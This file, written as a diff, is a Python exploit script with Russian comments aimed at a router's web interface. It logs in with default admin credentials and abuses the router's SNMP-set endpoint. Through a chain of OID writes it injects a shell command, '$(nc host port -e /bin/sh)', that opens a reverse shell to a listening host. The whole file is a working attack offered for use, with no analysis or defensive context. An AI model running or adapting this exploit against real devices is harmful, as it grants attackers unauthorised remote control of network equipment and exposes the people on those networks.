@@ -1,0 +1,78 @@
+import requests
+import base64
+import logging
+
+# Настройки логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Настройки маршрутизатора
+router_url = "http://192.168.0.1"
+user = "admin"
+passwd = "password"
+
+# Локальные настройки для выполнения команды
+local_host = "192.168.0.6"
+local_port = 80
+
+# Основная функция для выполнения эксплоита
+def exploit():
+    logging.info("Начало авторизации...")
+    try:
+        session_cookie = authorize_user(user, passwd)
+        if not session_cookie:
+            raise ValueError("Не удалось получить cookie сеанса")
+        logging.info("Генерация полезной нагрузки...")
+        payload_command = create_payload(local_host, local_port)
+        logging.info("Отправка полезной нагрузки...")
+        execute_payload(payload_command, session_cookie)
+        logging.info("Готово, проверьте shell...")
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+
+# Создание заголовка авторизации в формате Base64
+def create_auth_header(username, password):
+    auth_str = f"{username}:{password}"
+    return base64.b64encode(auth_str.encode("ascii")).decode("ascii")
+
+# Форматирование параметров запроса без кодирования
+def format_params(params):
+    return "&".join(f"{k}={v}" for k, v in params.items())
+
+# Авторизация пользователя и получение session cookie
+def authorize_user(username, password):
+    auth_header = create_auth_header(username, password)
+    login_url = f"{router_url}/login"
+    login_params = format_params({"arg": auth_header, "_n": 1})
+    try:
+        response = requests.get(login_url, params=login_params)
+        response.raise_for_status()
+        return response.content.decode('UTF-8')
+    except requests.RequestException as e:
+        logging.error(f"Ошибка при авторизации: {e}")
+        return None
+
+# Установка OID значений на маршрутизаторе
+def set_oid_value(oid_value, session_cookie):
+    snmp_url = f"{router_url}/snmpSet"
+    snmp_params = {"oid": oid_value, "_n": 1}
+    cookies = {"credential": session_cookie}
+    try:
+        requests.get(snmp_url, params=snmp_params, cookies=cookies)
+    except requests.RequestException as e:
+        logging.error(f"Ошибка при установке OID: {e}")
+
+# Создание команды полезной нагрузки
+def create_payload(host, port):
+    return f"$\(nc%20{host}%20{port}%20-e%20/bin/sh)"
+
+# Отправка полезной нагрузки с использованием установленных OID значений
+def execute_payload(payload, cookie):
+    set_oid_value("1.3.6.1.4.1.4115.1.20.1.1.7.1.0=16;2;", cookie)
+    set_oid_value(f"1.3.6.1.4.1.4115.1.20.1.1.7.2.0={payload};4;", cookie)
+    set_oid_value("1.3.6.1.4.1.4115.1.20.1.1.7.3.0=1;66;", cookie)
+    set_oid_value("1.3.6.1.4.1.4115.1.20.1.1.7.4.0=64;66;", cookie)
+    set_oid_value("1.3.6.1.4.1.4115.1.20.1.1.7.5.0=101;66;", cookie)
+    set_oid_value("1.3.6.1.4.1.4115.1.20.1.1.7.9.0=1;2;", cookie)
+
+if __name__ == '__main__':
+    exploit()
